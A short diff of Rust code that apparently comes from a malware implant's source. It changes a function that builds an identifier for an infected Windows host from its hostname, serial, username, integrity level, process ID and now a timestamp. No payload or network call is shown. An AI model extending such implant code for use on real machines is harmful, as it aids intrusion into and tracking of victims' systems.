@@ -511,7 +511,9 @@ fn build_implant_id() -> String {
 
     let pid = unsafe { GetCurrentProcessId() };
 
-    format!("{hostname}_{serial}_{username}_{integrity}_{pid}")
+    let epoch_time = epoch_now();
+
+    format!("{hostname}|{serial}|{username}|{integrity}|{pid}|{epoch_time}")
 }
 
 pub fn get_hostname() -> String {
